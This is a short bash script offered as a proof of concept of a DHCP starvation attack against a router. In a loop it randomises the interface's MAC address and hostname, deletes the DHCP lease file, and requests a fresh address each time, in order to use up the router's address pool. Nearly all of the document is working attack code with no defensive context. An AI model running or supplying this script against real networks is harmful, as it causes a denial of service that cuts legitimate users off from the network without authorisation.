#!/bin/bash

## simple proof of concept of a DHCP drain attack

## This script keeps requesting the router for new ip addresses,
## Depending on the subnet size eventually the router will run out of ip addresses

INTERFACE=$1
echo $INTERFACE
for i in {1..254} # $ for a /24 subnet
do
    ## incase the router is keeping track of MAC or hostname (for example there could only be one ip address on a MAC/hostname)
    macchanger $INTERFACE -r
    hostnamectl set-hostname $(openssl rand -hex 12)

    ## make sure dhclient will send a DHCPDISCOVER
    rm /var/lib/dhcp/dhclient.leases 

    dhclient -i $INTERFACE -v
done



